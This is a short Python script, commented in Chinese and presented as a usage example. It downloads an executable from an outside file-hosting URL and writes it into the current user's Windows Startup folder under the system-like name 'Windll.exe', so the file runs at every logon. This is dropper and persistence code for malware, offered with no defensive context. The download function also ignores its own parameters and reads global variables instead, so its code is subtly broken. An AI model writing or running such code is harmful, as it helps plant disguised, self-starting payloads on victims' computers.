import requests
import os


# 定义下载函数
def download_file(_url, _save_path):
    response = requests.get(url, stream=True)
    with open(save_path, 'wb') as f:
        for chunk in response.iter_content(chunk_size=8192):
            f.write(chunk)

# 获取Windows启动文件夹路径
def get_startup_folder_path():
    # 获取当前用户的用户名
    username = os.getlogin()
    # 构建启动文件夹路径
    startup_folder_path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    return startup_folder_path

# 使用示例
if __name__ == "__main__":
    url = "https://cccimg.com/down.php/3d961495fa0bd4c7be0e4d8740a699f8.exe"
    startup_folder_path = get_startup_folder_path()
    file_name = "Windll.exe"  # 你需要指定文件名
    save_path = os.path.join(startup_folder_path, file_name)
    download_file(url, save_path)
